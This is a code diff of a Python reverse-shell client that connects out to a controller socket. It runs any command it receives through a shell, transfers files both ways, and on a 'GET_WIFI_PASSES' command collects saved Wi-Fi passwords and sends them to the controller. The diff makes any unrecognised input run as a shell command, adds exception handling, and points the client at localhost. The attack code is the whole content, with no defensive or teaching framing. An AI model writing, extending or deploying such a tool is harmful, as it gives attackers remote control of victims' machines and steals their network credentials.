@@ -68,31 +68,37 @@ def get_command():
 
 
 def cater_command(command_got):
-    result = None
-    if command_got[:3] == "cd ":
-        os.chdir(command_got[3:])
-        result = f'[+] Changed directory to {command_got[3:]}'
-    elif command == 'GET_WIFI_PASSES':
-        credentials = get_wifi_passwords()
-        s.sendall(bytes(credentials, "UTF-8"))
-    elif command_got.strip() == "ls":
-        execute = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
-    elif command.strip() == 'dir':
-        execute = subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
-    elif command_got[:9] == 'download ':
-        upload_file(command_got[9:])
-    elif command[:7] == "upload ":
-        download_file(command[7:])
-    elif command_got[:7] == "CUSTOM ":
-        execute = subprocess.Popen(command_got[7:], shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
+    try:
+        print(f"{command_got[:7]}")
+        result = None
+        if command_got[:3] == "cd ":
+            os.chdir(command_got[3:])
+            result = f'[+] Changed directory to {command_got[3:]}'
+        elif command == 'GET_WIFI_PASSES':
+            credentials = get_wifi_passwords()
+            s.sendall(bytes(credentials, "UTF-8"))
+        elif command_got.strip() == "ls":
+            execute = subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+        elif command.strip() == 'dir':
+            execute = subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+        elif command_got[:9] == 'download ':
+            upload_file(command_got[9:])
+        elif command[:7] == "upload ":
+            download_file(command[7:])
+        else:
+            execute = subprocess.Popen(command_got, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            print(type(result))
 
-    return result
+        return result
+    except Exception as error:
+        print("[!] Got an exception while running command")
+        return str(error)
 
 
 def reliable_send(data):
@@ -101,7 +107,7 @@ def reliable_send(data):
 
 
 s = socket.socket()
-ip = '192.168.1.1'
+ip = 'localhost'
 port = 5000
 
 connected = False
@@ -134,5 +140,5 @@ while True:
             else:
                 raise socket.error
         except socket.error as e:
-            print("Connection Broken: ", e)
+            print(": ", e)
             connected = False
